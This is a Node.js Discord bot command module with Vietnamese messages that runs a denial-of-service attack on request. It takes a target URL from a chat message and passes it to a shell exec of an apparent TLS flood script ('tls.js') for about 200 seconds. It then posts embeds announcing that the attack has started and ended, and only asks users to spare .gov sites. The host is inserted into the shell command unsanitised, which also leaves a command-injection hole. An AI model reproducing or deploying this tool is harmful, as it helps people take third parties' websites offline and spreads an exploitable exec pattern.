const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../RoomID.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu .TLS-DETELEC https://example.com/`")
	.setFooter("Vui lòng không tấn công các website có domain .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`node tls.js ${host} 1200 req 300`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **Virtualization** 🔥')
	.setTimestamp()
	.setDescription("**► Cuộc tấn công đã kết thúc 💥**")
	.setFooter('© Developer: voleminh#2331', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 200000); //time in milliseconds
var gifler = ["https://64.media.tumblr.com/acbddd598f3d7b2f31c030a03ce65327/c0bf62d52f6add7d-e9/s640x960/0f0e6e0c2d185689d4bfe2c2a610a75d345a6db1.gifv", "https://genk.mediacdn.vn/k:2016/6-1474109930503/15tamanhgifphananhhoanhaocamgiaccuafanhammoanime.gif", "https://genk.mediacdn.vn/k:2016/6-1474109930503/15tamanhgifphananhhoanhaocamgiaccuafanhammoanime.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **𝘝𝘪𝘳𝘵𝘶𝘢𝘭𝘪𝘻𝘢𝘵𝘪𝘰𝘯** 🔥')
	.setTimestamp()
  .setDescription("**𝐔𝐬𝐞𝐫**: `" + message.author.username + "` \n **𝐇𝐨𝐬𝐭**: `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝**: `TLS-DETELEC⛈️` \n **𝐓𝐢𝐦𝐞**: `180 𝐒𝐞𝐜𝐜𝐨𝐧𝐝 `")	
  .setFooter('© Developer: voleminh#2331', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['tls'],
  permLevel: 0
}

exports.help = {
  name: 'TLS-DETELEC',
  description: 'Minh',
  usage: 'TLS-DETELEC'
}